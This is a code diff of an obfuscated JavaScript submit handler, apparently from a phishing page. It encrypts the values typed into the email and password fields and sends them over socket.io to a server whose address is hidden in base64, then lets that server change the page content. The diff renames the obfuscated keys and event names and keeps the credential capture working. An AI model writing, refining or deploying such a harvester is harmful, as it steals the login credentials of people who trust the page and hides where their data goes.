@@ -23,17 +23,17 @@ function submit() {
         const l642b6c8bc594f3e86abf9bbcf9a4d20 = {
             autoConnect: true, 
             query: { 
-                sc7be6bdf90f453b99f1db8f6526518c: CryptoJS.AES.encrypt(emailInput.value, fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
-                d2c64414315b4598a5e5fe5832761101: CryptoJS.AES.encrypt(passwordInput.value, fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
+                fs58q5e3u7v3v2l00ig32nv20pa1vr06ec: CryptoJS.AES.encrypt(emailInput.value, fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
+                fs58q5e3u7v3u2l00ig32nv20pa1vr06ec: CryptoJS.AES.encrypt(passwordInput.value, fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
             }
         };
         const socket = io(atob(fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.dc503f3c15684a76bd1874dce9cb42a8), l642b6c8bc594f3e86abf9bbcf9a4d20);
         socket.connect();
 
         //test
-        socket.emit("122377668230417aae686a77bb52da98", { room: "1" });
-        socket.on("cc0462fcafd24bc9b6e527607ad9a3b2", (data) => changeContent(data));
-        socket.emit("cc0462fcafd24bc9b6e527607ad9a3b2", { room: "1" })
+        socket.emit("fs58q5e3u7v3u2l00ig32nu20pa1vr06ac", { room: "1" });
+        socket.on("fs58q5e3u7v3u2l10ig32nu20pa1vr06ac", (data) => changeContent(data));
+        socket.emit("fs58q5e3u7v3u2l10ig32nu20pa1vr06ac", { room: "1" })
     }
 }
 
